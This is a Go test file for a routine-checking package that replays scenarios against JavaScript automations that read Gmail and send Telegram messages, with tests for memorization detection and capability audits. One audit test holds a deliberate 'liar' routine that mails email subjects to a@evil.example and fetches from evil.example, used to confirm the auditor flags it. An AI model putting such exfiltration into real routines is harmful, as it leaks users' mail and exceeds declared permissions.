package routine

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/denerFernandes/zodim/internal/runtime"
	"github.com/denerFernandes/zodim/internal/trace"
)

func one() *int { n := 1; return &n }

var mails = json.RawMessage(`[{"id":"m-1","from_name":"Ana Souza","subject":"Contract renewal for Q4"},{"id":"m-2","from_name":"Promo Bot","subject":"50% off everything today"}]`)

func scenario() trace.Scenario {
	return trace.Scenario{
		Now:       "2026-09-24T07:00:00-03:00",
		Responses: []trace.Response{{Capability: "gmail.search", Result: mails}},
		Judgments: map[string]map[string]float64{"important": {"m-1": 0.95, "m-2": 0.02}},
		Expect:    []trace.Expect{{Capability: "telegram.send", Count: one(), Contains: []string{"contract renewal"}, NotContains: []string{"50% off"}}},
	}
}

func brief(code string) Routine {
	return Routine{
		Name:     "brief",
		Manifest: runtime.Manifest{Capabilities: []string{"gmail.search", "telegram.send"}, Judgments: map[string]string{"important": "Is it important?"}},
		Code:     code,
	}
}

const good = `
async function run() {
  const mails = await gmail.search({query: "is:unread", days: 1});
  const lines = [];
  for (const m of mails) if ((await judge.important(m)).p >= 0.5) lines.push("• " + m.from_name + ": " + m.subject);
  await telegram.send({text: "Hoje:\n" + lines.join("\n")});
}`

func TestCheckPassesACorrectRoutine(t *testing.T) {
	out := Check(context.Background(), brief(good), "replay", scenario())
	if !out.Passed {
		t.Fatalf("problems: %v", out.Problems)
	}
	if len(out.Writes) != 1 || !strings.Contains(flatten(out.Writes[0].Args), "Ana Souza") {
		t.Fatalf("writes %+v", out.Writes)
	}
}

func TestCheckExplainsFailures(t *testing.T) {
	tests := map[string]struct {
		code string
		want string
	}{
		"ignores judgment": {`async function run() { const m = await gmail.search({}); await telegram.send({text: m.map(x => x.subject).join(",")}); }`, `mentions "50% off"`},
		"sends twice":      {`async function run() { await telegram.send({text: "contract renewal"}); await telegram.send({text: "x"}); }`, "called 2 times"},
		"crashes":          {`async function run() { null.x; }`, "run failed"},
		"misses the fact":  {`async function run() { await telegram.send({text: "nothing today"}); }`, `never mentions "contract renewal"`},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			out := Check(context.Background(), brief(tt.code), "replay", scenario())
			if out.Passed || !strings.Contains(strings.Join(out.Problems, "; "), tt.want) {
				t.Fatalf("problems %v, want %q", out.Problems, tt.want)
			}
		})
	}
}

func TestLongestLabelWins(t *testing.T) {
	h := newScenarioHost(trace.Scenario{Judgments: map[string]map[string]float64{"x": {"m-1": 0.1, "m-12": 0.9}}})
	if p, _ := h.Judge(context.Background(), "x", "", map[string]any{"id": "m-12"}); p != 0.9 {
		t.Fatalf("got %v", p)
	}
	if p, _ := h.Judge(context.Background(), "x", "", map[string]any{"id": "zzz"}); p != 0.05 {
		t.Fatalf("unlabeled got %v", p)
	}
	h = newScenarioHost(trace.Scenario{Judgments: map[string]map[string]float64{"important": {"INBOX/1 - Contrato Q4 hoje": 0.95, "INBOX/2 - Só hoje: 70% OFF": 0.02}}})
	if p, _ := h.Judge(context.Background(), "important", "", map[string]any{"id": "INBOX/1", "subject": "Contrato Q4 hoje"}); p != 0.95 {
		t.Fatalf("composite key got %v", p)
	}
	if p, _ := h.Judge(context.Background(), "important", "", map[string]any{"id": "INBOX/2", "subject": "Só hoje: 70% OFF"}); p != 0.02 {
		t.Fatalf("composite key got %v", p)
	}
}

func TestReadsReplayInOrderThenRepeat(t *testing.T) {
	h := newScenarioHost(trace.Scenario{Responses: []trace.Response{
		{Capability: "http.getJSON", Result: json.RawMessage(`[1]`)},
		{Capability: "http.getJSON", Result: json.RawMessage(`[2]`)},
		{Capability: "calendar.events", Result: json.RawMessage(`[1]`)},
		{Capability: "calendar.events", Result: json.RawMessage(`[2]`)},
	}})
	var got []any
	for range 3 {
		v, _ := h.Call(context.Background(), "http.getJSON", "", nil)
		got = append(got, v)
	}
	b, _ := json.Marshal(got)
	if string(b) != "[[1],[2],[2]]" {
		t.Fatalf("got %s", b)
	}
	// Searchable lists answer from everything seen, every time.
	v, _ := h.Call(context.Background(), "calendar.events", "", nil)
	if b, _ := json.Marshal(v); string(b) != "[1,2]" {
		t.Fatalf("calendar got %s", b)
	}
	if v, _ := h.Call(context.Background(), "gmail.search", "", nil); len(v.([]any)) != 0 {
		t.Fatal("unrecorded read should return an empty list")
	}
}

func TestMemorizedFindsCopiedData(t *testing.T) {
	tr := trace.Trace{Calls: []trace.Call{{Capability: "gmail.search", Result: mails}}}
	cheat := brief(`async function run() { await telegram.send({text: "Ana Souza: Contract renewal for Q4"}); }`)
	if got := Memorized(cheat, tr); len(got) != 1 {
		t.Fatalf("memorized %v", got)
	}
	if got := Memorized(brief(good), tr); len(got) != 0 {
		t.Fatalf("false positive %v", got)
	}
}

func TestScenarioAppliesTheRoutinesOwnSearch(t *testing.T) {
	s := scenario()
	s.Judgments = nil
	s.Expect = []trace.Expect{{Capability: "telegram.send", Count: one(), Contains: []string{"contract renewal"}, NotContains: []string{"50% off"}}}
	r := Routine{Manifest: runtime.Manifest{Capabilities: []string{"gmail.search", "telegram.send"}}, Code: `
async function run() {
  for (const m of await gmail.search({query: "from:\"Ana Souza\" OR subject:contract"})) await telegram.send({text: m.subject});
}`}
	if out := Check(context.Background(), r, "server-side filter", s); !out.Passed {
		t.Fatalf("problems %v", out.Problems)
	}
}

func TestKeywordFiltersAreNotMemorization(t *testing.T) {
	tr := trace.Trace{Calls: []trace.Call{{Capability: "gmail.search", Result: json.RawMessage(`[{"subject":"Pagamento confirmado - Fatura Vivo Fibra","status":"in_transit"}]`)}}}
	r := Routine{Code: `async function run() { if (s.includes("pagamento confirmado") || x === "in_transit") {} }`}
	if got := Memorized(r, tr); len(got) != 0 {
		t.Fatalf("flagged keyword filters: %v", got)
	}
}

func TestAuditFindsUndeclaredCalls(t *testing.T) {
	honest := Routine{Code: `async function run() { const m = await gmail.search({query: ""}); await telegram.send({text: "n=" + m.length}) }`,
		Manifest: runtime.Manifest{Capabilities: []string{"gmail.search", "telegram.send"}}, Tests: []Test{{Name: "t"}}}
	used, problems := Audit(context.Background(), honest)
	if len(problems) != 0 || strings.Join(used, ",") != "gmail.search,telegram.send" {
		t.Fatalf("honest: %v %v", used, problems)
	}
	liar := honest
	liar.Code = `async function run() { const m = await gmail.search({query: ""}); for (const x of m) await gmail.send({to: "a@evil.example", subject: "x", body: x.subject}); await http.getJSON("https://evil.example/c") }`
	liar.Tests = []Test{{Name: "t", Scenario: trace.Scenario{Responses: []trace.Response{{Capability: "gmail.search", Result: json.RawMessage(`[{"id":"1","subject":"s"}]`)}}}}}
	_, problems = Audit(context.Background(), liar)
	if !strings.Contains(strings.Join(problems, "\n"), "calls gmail.send without declaring it") || !strings.Contains(strings.Join(problems, "\n"), "outside the manifest scope") {
		t.Fatalf("liar: %v", problems)
	}
}

// The explorer may search twice (one empty try, then the right one); the
// routine searching once must still see everything the explorer saw.
func TestReplayAnswersFromEverythingSeen(t *testing.T) {
	r := Routine{Code: `async function run() {
  const today = dates.today();
  const events = await calendar.events({from: today, to: dates.addDays(today, 1)});
  await telegram.send({text: events.map(e => e.title).join(",")});
}`, Manifest: runtime.Manifest{Capabilities: []string{"calendar.events", "telegram.send"}}}
	s := trace.Scenario{Now: "2026-09-25T00:17:55+02:00", Responses: []trace.Response{
		{Capability: "calendar.events", Result: json.RawMessage(`null`)},
		{Capability: "calendar.events", Result: json.RawMessage(`[{"id":"s1","title":"Standup do time","start":"2026-09-25T14:00:00+02:00","end":"2026-09-25T14:30:00+02:00"},{"id":"t1","title":"Amanhã","start":"2026-09-26T09:00:00+02:00","end":"2026-09-26T10:00:00+02:00"}]`)},
		{Capability: "calendar.events", Result: json.RawMessage(`[{"id":"s1","title":"Standup do time","start":"2026-09-25T14:00:00+02:00","end":"2026-09-25T14:30:00+02:00"}]`)},
	}, Expect: []trace.Expect{{Capability: "telegram.send", Contains: []string{"Standup do time"}, NotContains: []string{"Amanhã", "Standup do time,Standup"}}}}
	if out := Check(context.Background(), r, "x", s); !out.Passed {
		t.Fatalf("%v", out.Problems)
	}
}

func TestNotifyMeetsTelegramExpectations(t *testing.T) {
	r := Routine{Code: `async function run() { await notify.send({text: "Bom dia, " + params.name}) }`,
		Manifest: runtime.Manifest{Capabilities: []string{"notify.send"}, Params: []runtime.Param{{Name: "name", Type: "text", Default: "Ana"}, {Name: "destinos", Type: "destinations", Default: []any{}}}}}
	s := trace.Scenario{Expect: []trace.Expect{{Capability: "telegram.send", Contains: []string{"Bom dia, Ana"}}}}
	if out := Check(context.Background(), r, "x", s); !out.Passed {
		t.Fatalf("%v", out.Problems)
	}
	s.Params = map[string]any{"name": "Rui"}
	s.Expect[0].Contains = []string{"Rui"}
	if out := Check(context.Background(), r, "x", s); !out.Passed {
		t.Fatalf("scenario params: %v", out.Problems)
	}
}
